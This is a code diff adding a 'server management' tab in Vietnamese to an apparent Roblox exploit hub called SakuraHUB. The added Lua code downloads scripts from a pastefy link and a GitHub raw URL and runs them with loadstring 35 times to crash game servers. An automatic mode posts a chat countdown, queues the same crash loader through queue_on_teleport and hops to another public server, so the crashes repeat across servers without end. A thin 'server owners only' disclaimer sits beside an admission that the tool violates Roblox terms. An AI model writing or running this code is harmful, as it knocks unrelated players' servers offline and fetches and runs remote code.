@@ -4563,6 +4563,290 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [VN]: Quản lý máy chủ（ベトナム語版）
+-- 攻撃系タブ（ブロック31）の直後に挿入
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+
+    -- ========================================================================
+    -- Hằng số
+    -- ========================================================================
+    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- Sập đơn lẻ (35 lần)
+    local AUTOLOGIC_URL = "https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/server-crash"  -- Vòng lặp vô hạn
+    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
+    local CRASH_LOOP_COUNT = 35
+
+    -- ========================================================================
+    -- Lấy HTTP
+    -- ========================================================================
+    local function safeHttpGet(url)
+        if type(game.HttpGet) == "function" then
+            return game:HttpGet(url)
+        elseif type(HttpGet) == "function" then
+            return HttpGet(url)
+        elseif type(game.HttpGet) == "function" then
+            return game.HttpGet(game, url)
+        end
+        error("HttpGet not available in this environment")
+    end
+
+    -- ========================================================================
+    -- Gửi chat (2 phương thức: TextChatService + Legacy)
+    -- ========================================================================
+    local function sendChatMessage(message)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            pcall(function()
+                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+                gc:SendAsync(message)
+            end)
+        end
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local smr = events:FindFirstChild("SayMessageRequest")
+            if smr then
+                pcall(function() smr:FireServer(message, "All") end)
+            end
+        end
+    end
+
+    -- ========================================================================
+    -- Chạy script sập (đơn lẻ, 35 lần)
+    -- ========================================================================
+    local function runCrashScript()
+        local ok, err = pcall(function()
+            local scriptContent = safeHttpGet(CRASH_URL)
+            for i = 1, CRASH_LOOP_COUNT do
+                pcall(function()
+                    loadstring(scriptContent)()
+                end)
+                task.wait(0.1)
+            end
+        end)
+        return ok, err
+    end
+
+    -- ========================================================================
+    -- Lấy JobId máy chủ khác
+    -- ========================================================================
+    local function getAnotherServerJobId()
+        local ok, result = pcall(function()
+            local url = string.format(
+                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
+                game.PlaceId
+            )
+            return HttpService:JSONDecode(safeHttpGet(url))
+        end)
+        if ok and result and result.data then
+            local currentJobId = game.JobId
+            for _, server in ipairs(result.data) do
+                if server.id and server.id ~= currentJobId then
+                    return server.id
+                end
+            end
+        end
+        return nil
+    end
+
+    -- ========================================================================
+    -- Dịch chuyển máy chủ
+    -- ========================================================================
+    local function teleportToAnotherServer()
+        local targetJobId = getAnotherServerJobId()
+        local localPlayer = Players.LocalPlayer
+        if targetJobId then
+            local ok = pcall(function()
+                local opts = Instance.new("TeleportOptions")
+                opts.ServerInstanceId = targetJobId
+                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
+            end)
+            if ok then return true end
+        end
+        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
+        return false
+    end
+
+    -- ========================================================================
+    -- Đếm ngược (1 lần)
+    -- ========================================================================
+    local function runCountdownOnce(onFinish)
+        task.spawn(function()
+            pcall(function() sendChatMessage(CHAT_HEADER) end)
+            task.wait(0.8)
+            pcall(function() sendChatMessage("5") end) task.wait(1)
+            pcall(function() sendChatMessage("4") end) task.wait(1)
+            pcall(function() sendChatMessage("3") end) task.wait(1)
+            pcall(function() sendChatMessage("2") end) task.wait(1)
+            pcall(function() sendChatMessage("1") end)
+            if onFinish then onFinish() end
+        end)
+    end
+
+    -- ========================================================================
+    -- Kiểm tra hỗ trợ queue_on_teleport
+    -- ========================================================================
+    local function hasQueueOnTeleport()
+        return (type(queue_on_teleport) == "function")
+            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
+    end
+
+    local function callQueueOnTeleport(script)
+        if type(queue_on_teleport) == "function" then
+            return pcall(function() queue_on_teleport(script) end)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+            return pcall(function() syn.queue_on_teleport(script) end)
+        end
+        return false
+    end
+
+    -- ========================================================================
+    -- Tạo tab
+    -- ========================================================================
+    local CrashTab = Window:MakeTab({
+        Name = "Quản lý máy chủ",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ Cấm lạm dụng",
+        "Chức năng thử nghiệm dành cho chủ máy chủ.\n" ..
+        "Không chạy trên máy chủ của người khác."
+    )
+
+    CrashTab:AddSection({ Name = "Chạy thử nghiệm" })
+
+    -- ========================================================================
+    -- ① Đơn lẻ (kiểm tra sập)
+    --    Chỉ chạy sPciZuXM 35 lần. Không dịch chuyển.
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⚡ Kiểm tra sập máy chủ (đơn lẻ, 35 lần liên tiếp)",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "Kiểm tra sập đơn lẻ",
+                Content = "Bắt đầu chạy 35 lần liên tiếp...",
+                Time = 3
+            })
+            task.spawn(function()
+                local ok, err = runCrashScript()
+                if ok then
+                    PlayActionSound()
+                    OrionLib:MakeNotification({
+                        Name = "Hoàn thành",
+                        Content = "Đã chạy xong 35 lần",
+                        Time = 5
+                    })
+                else
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Lỗi",
+                        Content = "Thất bại: " .. tostring(err),
+                        Time = 5
+                    })
+                end
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- ② Tự động vô hạn
+    --    Lần 1 (máy chủ này):
+    --      Đếm ngược → đặt trước server-crash vào queue_on_teleport
+    --      Kích hoạt dịch chuyển → chạy sPciZuXM (35 lần) trên máy chủ này
+    --    Lần 2 trở đi (máy chủ mới):
+    --      server-crash tự động tải → tự đếm ngược·sập·dịch chuyển·tự đặt trước
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔁 Chế độ tự động sập (vòng lặp vô hạn)",
+        Callback = function()
+            PlayActionSound()
+
+            if not hasQueueOnTeleport() then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "❌ Không thể thực thi",
+                    Content = "Executor này không hỗ trợ queue_on_teleport. Không thể chạy vòng lặp vô hạn.",
+                    Time = 8
+                })
+                return
+            end
+
+            OrionLib:MakeNotification({
+                Name = "🔁 Chế độ tự động",
+                Content = "Bắt đầu đếm ngược → máy chủ này cũng sẽ chạy 35 lần sập",
+                Time = 3
+            })
+
+            runCountdownOnce(function()
+                -- Đặt trước server-crash (chỉ tải URL) cho máy chủ tiếp theo
+                local nextScript = string.format([[
+loadstring(game:HttpGet("%s"))()
+]], AUTOLOGIC_URL)
+                local ok = callQueueOnTeleport(nextScript)
+                if not ok then
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Lỗi",
+                        Content = "Đặt trước queue_on_teleport thất bại",
+                        Time = 4
+                    })
+                    return
+                end
+
+                -- Kích hoạt dịch chuyển trước (để không bị ảnh hưởng bởi sập)
+                task.spawn(function() teleportToAnotherServer() end)
+                task.wait(0.1)
+
+                -- Máy chủ này cũng chạy sPciZuXM (35 lần)
+                task.spawn(function()
+                    local crashOk = runCrashScript()
+                    if crashOk then
+                        PlayActionSound()
+                        OrionLib:MakeNotification({
+                            Name = "Chạy sập lần đầu",
+                            Content = "Đã đặt trước server-crash · Đang chuyển sang máy chủ khác",
+                            Time = 4
+                        })
+                    else
+                        PlayErrorSound()
+                    end
+                end)
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- Thông tin
+    -- ========================================================================
+    CrashTab:AddSection({ Name = "Thông tin" })
+    CrashTab:AddParagraph(
+        "Cách dùng",
+        "① Đơn lẻ: chạy sPciZuXM 35 lần (hoàn tất trên máy chủ này)\n" ..
+        "② Tự động vô hạn: đếm ngược → đặt trước server-crash → kích hoạt dịch chuyển → chạy 35 lần sập trên máy chủ này\n" ..
+        "   Sau khi đến máy chủ mới, server-crash sẽ tự động đếm ngược · sập · dịch chuyển · tự đặt trước để tạo vòng lặp vô hạn."
+    )
+    CrashTab:AddParagraph(
+        "URL sử dụng",
+        "・Sập đơn lẻ: " .. CRASH_URL .. "\n" ..
+        "・Tự động vô hạn: " .. AUTOLOGIC_URL
+    )
+    CrashTab:AddParagraph(
+        "Lưu ý",
+        "・Executor không hỗ trợ queue_on_teleport sẽ không chạy được vòng lặp vô hạn\n" ..
+        "・Nếu cạn máy chủ công khai, sẽ dùng Teleport() dự phòng\n" ..
+        "・Chuyển máy chủ liên tục + sập là vi phạm điều khoản Roblox (tự chịu trách nhiệm)"
+    )
+end
+
+-- ============================================================================
 -- Khối 32: Tab Chiếm tàu hỏa
 -- ============================================================================
 do
